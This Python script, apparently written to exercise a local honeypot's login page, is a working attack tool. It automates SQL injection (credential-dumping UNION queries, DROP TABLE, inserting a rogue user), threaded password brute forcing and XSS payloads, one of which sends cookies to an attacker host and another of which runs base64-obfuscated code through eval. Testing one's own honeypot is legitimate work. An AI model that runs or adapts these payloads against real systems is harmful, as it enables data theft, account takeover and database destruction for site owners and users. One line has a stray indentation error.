import requests
import time
import random
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Style

class AggressiveHoneypotAttacker:
    def __init__(self, target_url="http://localhost:8080"):
        colorama.init()
        self.setup_logging()
        self.target_url = target_url
        self.login_url = f"{target_url}/login"
        self.attack_count = 0
        self.success_count = 0
        self.min_delay = 0.1
        self.max_delay = 0.5

    def print_status(self, message, color=Fore.WHITE):
        """Affiche un message coloré dans le terminal"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Style.RESET_ALL}")

    def setup_logging(self):
        """Configure le système de logging"""
        log_file = f'attacks_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('HoneypotAttacker')
        self.print_status(f"Logging to {log_file}", Fore.CYAN)

    def send_attack(self, username, password, attack_type='generic'):
        """Envoie une attaque avec logs détaillés"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'username': username,
                'password': password
            }

            self.attack_count += 1
            start_time = time.time()
            
            self.print_status(
                f"Attack #{self.attack_count} | Type: {attack_type} | Payload: {username}", 
                Fore.YELLOW
            )

            response = requests.post(
                self.login_url,
                data=data,
                headers=headers,
                timeout=5
            )

            duration = time.time() - start_time
                        log_entry = (
                f"Attack #{self.attack_count} | "
                f"Type: {attack_type} | "
                f"Username: {username} | "
                f"Password: {password} | "
                f"Status: {response.status_code} | "
                f"Duration: {duration:.2f}s | "
                f"Response Length: {len(response.text)}"
            )

            if response.status_code == 200:
                self.success_count += 1
                self.print_status(f"Success! {log_entry}", Fore.GREEN)
            else:
                self.print_status(f"Failed. {log_entry}", Fore.RED)

            self.logger.info(log_entry)
            return response

        except Exception as e:
            error_msg = f"Attack failed: {str(e)} | Payload: {username}"
            self.print_status(error_msg, Fore.RED)
            self.logger.error(error_msg)
            return None

    def sql_injection_attack(self, num_attacks=50):
        """Lance des attaques par injection SQL agressives"""
        self.print_status("Starting SQL Injection Attack...", Fore.CYAN)
        
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL,NULL--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "admin') OR ('1'='1",
            "1' ORDER BY 1--+",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--'",
            "' AND (SELECT 'x' FROM users LIMIT 1)='x'--",
            "'; DROP TABLE users--",
            "admin' AND 1=1 AND 'one'='one",
            "' UNION SELECT username, password FROM users--",
            "' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%')--",
            "'; INSERT INTO users VALUES ('hacker','password')--",
            "' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--"
        ] * (num_attacks // 15 + 1) 

        for payload in sql_payloads[:num_attacks]:
            self.send_attack(payload, "test", "SQL Injection")
            time.sleep(random.uniform(self.min_delay, self.max_delay))

    def bruteforce_attack(self, num_threads=5, attempts_per_thread=20):
        """Lance une attaque par force brute multi-thread"""
        self.print_status("Starting Bruteforce Attack...", Fore.CYAN)
        
        passwords = [
            "admin123", "password", "123456", "qwerty",
            "letmein", "dragon", "monkey", "abc123",
            "pass123", "master", "superman", "admin",
            "root123", "secret", "qwerty123", "password123",
            "admin1234", "adminadmin", "welcome", "administrator"
        ] * (attempts_per_thread // 20 + 1)

        def worker(thread_id):
            self.print_status(f"Starting bruteforce thread {thread_id}", Fore.CYAN)
            for i in range(attempts_per_thread):
                password = random.choice(passwords)
                self.send_attack(f"admin{i}", password, "Bruteforce")
                time.sleep(random.uniform(self.min_delay, self.max_delay))

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(worker, range(num_threads))

    def xss_attack(self, num_attacks=50):
        """Lance des attaques XSS"""
        self.print_status("Starting XSS Attack...", Fore.CYAN)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<link rel=import href=data:text/html,<script>alert('XSS')</script>",
            "<marquee onstart=alert('XSS')>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<script>fetch('http://attacker.com/'+document.cookie)</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>"
        ] * (num_attacks // 15 + 1)

        for payload in xss_payloads[:num_attacks]:
            self.send_attack(payload, payload, "XSS")
            time.sleep(random.uniform(self.min_delay, self.max_delay))

    def run_comprehensive_attack(self, duration_minutes=30):
        """Lance une attaque complète pendant une durée spécifiée"""
        self.print_status(f"Starting comprehensive attack for {duration_minutes} minutes...", Fore.CYAN)
        end_time = time.time() + (duration_minutes * 60)
        
        while time.time() < end_time:
            attack_functions = [
                lambda: self.sql_injection_attack(num_attacks=30),
                lambda: self.bruteforce_attack(num_threads=5, attempts_per_thread=20),
                lambda: self.xss_attack(num_attacks=30)
            ]
            
            attack_func = random.choice(attack_functions)
            try:
                attack_func()
                self.print_status(
                    f"Progress: {self.success_count}/{self.attack_count} successful attacks", 
                    Fore.CYAN
                )
            except Exception as e:
                self.print_status(f"Attack failed: {str(e)}", Fore.RED)
            
            time.sleep(random.uniform(1, 3))

def main():
    attacker = AggressiveHoneypotAttacker("http://localhost:8080")
    attacker.run_comprehensive_attack(duration_minutes=30)

if __name__ == "__main__":
    main()
